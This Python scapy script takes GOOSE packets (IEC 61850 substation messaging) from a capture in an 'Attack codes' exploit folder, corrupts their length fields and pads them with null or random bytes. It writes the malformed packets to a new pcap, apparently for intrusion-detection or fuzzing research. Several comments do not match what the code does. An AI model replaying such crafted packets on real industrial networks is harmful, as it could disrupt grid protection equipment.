from gooseFunc import *
from scapy.all import *
import random

GOOSE_TYPE = 0x88b8

# Load packets from the pcap file

file = 'Attack codes\goose_exploit\ids_bust_boolean.pcapng'
packets = rdpcap(file)

g_packets = []  # List to store GOOSE packets

# Identify and collect GOOSE packets
for packet in packets:
    if goose_check(packet, GOOSE_TYPE):                                  
        g_packets.append(packet)

n = 1

# Assuming g_packets has at least one GOOSE packet
for mod_packet in g_packets:
  
    # Parse the GOOSE packet using your defined structure
    mod_data = GOOSE(mod_packet.load)
    mod_pdu = mod_data[GOOSEPDU].original

    # Modify the length field (example adding 34 bytes to length)
    new_length = len(mod_packet.load) + n
    n += 1
    if n > 100:
        n = 1

    # Update mod_data in-place
    mod_data.length = new_length

    # Encode the modified GOOSE PDU (ASN.1/BER encoding)
    encoded_data = encoder.encode(gooseAllData_decode(mod_pdu))

    # Randomly decide whether to inject null bytes or random hex data
    if random.choice([True, False]):
        # Inject null bytes (assuming injecting 10 null bytes)
        null_bytes = b'\x00' * n
        mod_packet.load += null_bytes
    else:
        # Generate random hex data (assuming 10 bytes of random data)
        random_data = bytes([random.randint(0, 255) for _ in range(10)])
        mod_packet.load += random_data

    # Rebuild the modified packet (GOOSE header + modified payload + remaining data structure)
    mod_packet.load = (
        struct.pack('!H', mod_data.appid) +
        struct.pack('!H', new_length) +
        struct.pack('!H', mod_data.reserved1) +
        struct.pack('!H', mod_data.reserved2) +
        encoded_data +
        mod_packet.load[12:]  # Assuming the rest of the packet follows the header
    )

    # Print the modified packet details
    # print("\nModified Frame:")
    # mod_packet.show()

    # Save the modified packet to a new pcap file
    f_name = 'null_rand_goose_len.pcapng'
    wrpcap(f_name, mod_packet, append=True)

    # Verify the modified packet's length
    # test_data = GOOSE(mod_packet.load)
    # print(f"Modified Packet Length: {test_data.length}")
